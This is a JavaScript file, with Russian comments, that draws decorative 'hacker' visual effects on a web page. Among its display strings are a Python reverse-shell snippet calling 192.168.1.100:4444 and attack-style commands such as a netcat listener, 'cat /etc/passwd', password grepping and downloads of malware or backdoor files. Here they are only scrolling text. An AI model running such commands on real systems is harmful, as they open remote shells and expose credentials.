// Дополнительные эффекты для создания атмосферы хакинга
class HackerEffects {
    constructor() {
        this.isActive = true;
        this.init();
    }

    init() {
        this.createBinaryRain();
        this.createCyberAttackSimulation();
        this.createNetworkNodes();
        this.createSecurityAlerts();
        this.createCodeExecution();
        this.createDataFlow();
    }

    // Дождь из бинарного кода
    createBinaryRain() {
        const container = document.createElement('div');
        container.id = 'binary-rain';
        container.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -15;
            overflow: hidden;
        `;
        document.body.appendChild(container);

        const createBinaryDrop = () => {
            if (!this.isActive) return;

            const drop = document.createElement('div');
            drop.style.cssText = `
                position: absolute;
                color: rgba(0, 255, 65, 0.3);
                font-family: 'JetBrains Mono', monospace;
                font-size: 16px;
                top: -50px;
                left: ${Math.random() * 100}%;
                animation: binary-fall ${3 + Math.random() * 4}s linear infinite;
                white-space: nowrap;
            `;
            
            // Создаем бинарную строку
            let binaryString = '';
            for (let i = 0; i < 20; i++) {
                binaryString += Math.random() > 0.5 ? '1' : '0';
            }
            drop.textContent = binaryString;
            
            container.appendChild(drop);

            setTimeout(() => {
                drop.remove();
            }, 7000);
        };

        setInterval(createBinaryDrop, 150);

        // CSS анимация
        const style = document.createElement('style');
        style.textContent = `
            @keyframes binary-fall {
                0% { transform: translateY(-50px); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translateY(100vh); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }

    // Симуляция кибератаки
    createCyberAttackSimulation() {
        const container = document.createElement('div');
        container.id = 'cyber-attack-sim';
        container.style.cssText = `
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            width: 400px;
            height: 120px;
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid rgba(255, 0, 64, 0.5);
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 10px;
            color: #ff0040;
            padding: 10px;
            z-index: -5;
            overflow: hidden;
            backdrop-filter: blur(5px);
        `;
        document.body.appendChild(container);

        const attacks = [
            '[ATTACK] Brute force detected: 127.0.0.1',
            '[EXPLOIT] Buffer overflow attempt',
            '[INJECT] SQL injection in progress',
            '[SCAN] Port scanning detected',
            '[BREACH] Unauthorized access attempt',
            '[MALWARE] Trojan.Win32.Generic detected',
            '[PHISHING] Suspicious email intercepted',
            '[DDOS] Distributed denial of service',
            '[BACKDOOR] Remote access established',
            '[KEYLOG] Keystroke logging active',
            '[CRYPTO] Ransomware encryption started',
            '[STEALTH] Rootkit installation detected',
            '[EXFIL] Data exfiltration in progress',
            '[PIVOT] Lateral movement detected',
            '[C2] Command & control callback'
        ];

        const simulateAttack = () => {
            const attack = document.createElement('div');
            attack.style.cssText = `
                margin-bottom: 2px;
                opacity: 0;
                transform: translateX(-10px);
                animation: attack-appear 0.3s ease-out forwards;
            `;
            
            const timestamp = new Date().toLocaleTimeString();
            attack.textContent = `[${timestamp}] ${attacks[Math.floor(Math.random() * attacks.length)]}`;
            
            container.appendChild(attack);

            // Удаляем старые записи
            while (container.children.length > 10) {
                container.removeChild(container.firstChild);
            }
        };

        setInterval(simulateAttack, 1000);

        // CSS анимация
        const style = document.createElement('style');
        style.textContent = `
            @keyframes attack-appear {
                0% { opacity: 0; transform: translateX(-10px); }
                100% { opacity: 1; transform: translateX(0); }
            }
        `;
        document.head.appendChild(style);
    }

    // Сетевые узлы
    createNetworkNodes() {
        const container = document.createElement('div');
        container.id = 'network-nodes';
        container.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -12;
            overflow: hidden;
        `;
        document.body.appendChild(container);

        const nodes = [];
        const nodeCount = 15;

        // Создаем узлы
        for (let i = 0; i < nodeCount; i++) {
            const node = document.createElement('div');
            node.style.cssText = `
                position: absolute;
                width: 8px;
                height: 8px;
                background: #00d4ff;
                border-radius: 50%;
                box-shadow: 0 0 10px #00d4ff;
                left: ${Math.random() * 100}%;
                top: ${Math.random() * 100}%;
                animation: node-pulse ${2 + Math.random() * 3}s ease-in-out infinite;
            `;
            
            container.appendChild(node);
            nodes.push({
                element: node,
                x: parseFloat(node.style.left),
                y: parseFloat(node.style.top)
            });
        }

        // Создаем связи между узлами
        const createConnections = () => {
            const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
            svg.style.cssText = `
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                pointer-events: none;
            `;
            container.appendChild(svg);

            nodes.forEach((node1, i) => {
                nodes.forEach((node2, j) => {
                    if (i !== j && Math.random() > 0.7) {
                        const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
                        line.setAttribute('x1', `${node1.x}%`);
                        line.setAttribute('y1', `${node1.y}%`);
                        line.setAttribute('x2', `${node2.x}%`);
                        line.setAttribute('y2', `${node2.y}%`);
                        line.setAttribute('stroke', 'rgba(0, 212, 255, 0.3)');
                        line.setAttribute('stroke-width', '1');
                        line.style.animation = `connection-fade ${3 + Math.random() * 2}s ease-in-out infinite`;
                        svg.appendChild(line);
                    }
                });
            });
        };

        createConnections();

        // CSS анимации
        const style = document.createElement('style');
        style.textContent = `
            @keyframes node-pulse {
                0%, 100% { transform: scale(1); opacity: 0.7; }
                50% { transform: scale(1.5); opacity: 1; }
            }
            @keyframes connection-fade {
                0%, 100% { opacity: 0; }
                50% { opacity: 0.5; }
            }
        `;
        document.head.appendChild(style);
    }

    // Предупреждения безопасности
    createSecurityAlerts() {
        const alertTypes = [
            { type: 'CRITICAL', color: '#ff0040', message: 'Unauthorized access detected' },
            { type: 'WARNING', color: '#ffa500', message: 'Suspicious activity detected' },
            { type: 'INFO', color: '#00d4ff', message: 'Security scan completed' },
            { type: 'ERROR', color: '#ff0040', message: 'Firewall breach attempt' },
            { type: 'ALERT', color: '#8b5cf6', message: 'Malware signature detected' }
        ];

        const createAlert = () => {
            const alert = alertTypes[Math.floor(Math.random() * alertTypes.length)];
            const alertElement = document.createElement('div');
            
            alertElement.style.cssText = `
                position: fixed;
                top: ${Math.random() * 50 + 10}%;
                left: ${Math.random() * 50 + 10}%;
                background: rgba(0, 0, 0, 0.9);
                border: 2px solid ${alert.color};
                border-radius: 5px;
                padding: 8px 12px;
                color: ${alert.color};
                font-family: 'JetBrains Mono', monospace;
                font-size: 12px;
                z-index: -8;
                opacity: 0;
                transform: scale(0.8);
                animation: alert-appear 0.5s ease-out forwards, alert-disappear 0.5s ease-out 2s forwards;
                pointer-events: none;
                white-space: nowrap;
                box-shadow: 0 0 20px ${alert.color}40;
            `;
            
            alertElement.innerHTML = `
                <strong>[${alert.type}]</strong> ${alert.message}
                <br><small>${new Date().toLocaleTimeString()}</small>
            `;
            
            document.body.appendChild(alertElement);

            setTimeout(() => {
                alertElement.remove();
            }, 3000);
        };

        setInterval(createAlert, 8000);

        // CSS анимации
        const style = document.createElement('style');
        style.textContent = `
            @keyframes alert-appear {
                0% { opacity: 0; transform: scale(0.8); }
                100% { opacity: 1; transform: scale(1); }
            }
            @keyframes alert-disappear {
                0% { opacity: 1; transform: scale(1); }
                100% { opacity: 0; transform: scale(0.8); }
            }
        `;
        document.head.appendChild(style);
    }

    // Исполнение кода
    createCodeExecution() {
        const container = document.createElement('div');
        container.id = 'code-execution';
        container.style.cssText = `
            position: fixed;
            top: 50%;
            left: 20px;
            transform: translateY(-50%);
            width: 300px;
            height: 200px;
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid rgba(0, 255, 65, 0.5);
            border-radius: 8px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 10px;
            color: #00ff41;
            padding: 10px;
            z-index: -6;
            overflow: hidden;
            backdrop-filter: blur(5px);
        `;
        document.body.appendChild(container);

        const codeLines = [
            'import socket, subprocess, os',
            'def reverse_shell():',
            '    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)',
            '    s.connect(("192.168.1.100", 4444))',
            '    while True:',
            '        data = s.recv(1024)',
            '        if data[:2] == "cd":',
            '            os.chdir(data[3:])',
            '        proc = subprocess.Popen(data, shell=True)',
            '        s.send(proc.stdout.read())',
            'reverse_shell()',
            'print("Connection established")',
            'os.system("whoami")',
            'import hashlib',
            'password = "admin123"',
            'hash_object = hashlib.md5(password.encode())',
            'print(hash_object.hexdigest())',
            'for i in range(1000):',
            '    print(f"Brute force attempt {i}")',
            'if auth_bypass():',
            '    print("Access granted")',
            'else:',
            '    print("Access denied")'
        ];

        let currentLine = 0;
        const executeLine = () => {
            if (currentLine >= codeLines.length) {
                currentLine = 0;
                container.innerHTML = '';
                return;
            }

            const line = document.createElement('div');
            line.style.cssText = `
                margin-bottom: 2px;
                opacity: 0;
                transform: translateX(-5px);
                animation: code-appear 0.5s ease-out forwards;
            `;
            
            line.textContent = `>>> ${codeLines[currentLine]}`;
            container.appendChild(line);
            currentLine++;

            // Удаляем старые строки
            while (container.children.length > 18) {
                container.removeChild(container.firstChild);
            }
        };

        setInterval(executeLine, 800);

        // CSS анимация
        const style = document.createElement('style');
        style.textContent = `
            @keyframes code-appear {
                0% { opacity: 0; transform: translateX(-5px); }
                100% { opacity: 1; transform: translateX(0); }
            }
        `;
        document.head.appendChild(style);
    }

    // Поток данных
    createDataFlow() {
        const container = document.createElement('div');
        container.id = 'data-flow';
        container.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -11;
            overflow: hidden;
        `;
        document.body.appendChild(container);

        const dataPackets = [
            'GET /admin HTTP/1.1',
            'POST /login.php',
            'SELECT * FROM users',
            'INSERT INTO logs',
            'UPDATE privileges SET',
            'DELETE FROM audit',
            'GRANT ALL PRIVILEGES',
            'REVOKE SELECT ON',
            'DROP TABLE users',
            'CREATE USER hacker',
            'nc -lvnp 4444',
            'chmod +x exploit.sh',
            'sudo -l',
            'cat /etc/passwd',
            'find / -name "*.txt"',
            'grep -r "password"',
            'wget malware.exe',
            'curl -O backdoor.py',
            'python3 keylogger.py',
            'nohup reverse_shell.sh &'
        ];

        const createDataPacket = () => {
            const packet = document.createElement('div');
            packet.style.cssText = `
                position: absolute;
                background: rgba(0, 255, 65, 0.1);
                border: 1px solid rgba(0, 255, 65, 0.3);
                border-radius: 4px;
                padding: 4px 8px;
                font-family: 'JetBrains Mono', monospace;
                font-size: 10px;
                color: #00ff41;
                white-space: nowrap;
                animation: data-flow ${5 + Math.random() * 3}s linear infinite;
                top: ${Math.random() * 100}%;
                left: -200px;
            `;
            
            packet.textContent = dataPackets[Math.floor(Math.random() * dataPackets.length)];
            container.appendChild(packet);

            setTimeout(() => {
                packet.remove();
            }, 8000);
        };

        setInterval(createDataPacket, 1500);

        // CSS анимация
        const style = document.createElement('style');
        style.textContent = `
            @keyframes data-flow {
                0% { transform: translateX(0); opacity: 0; }
                10% { opacity: 1; }
                90% { opacity: 1; }
                100% { transform: translateX(calc(100vw + 200px)); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }

    // Деактивация всех эффектов
    deactivate() {
        this.isActive = false;
        const effects = [
            'binary-rain',
            'cyber-attack-sim',
            'network-nodes',
            'code-execution',
            'data-flow'
        ];
        
        effects.forEach(id => {
            const element = document.getElementById(id);
            if (element) {
                element.remove();
            }
        });
    }
}

// Инициализация эффектов
document.addEventListener('DOMContentLoaded', () => {
    const hackerEffects = new HackerEffects();
    
    // Добавляем управление эффектами
    window.HackerEffects = hackerEffects;
    
    // Возможность отключить эффекты по клавише Escape
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            hackerEffects.deactivate();
        }
    });
}); 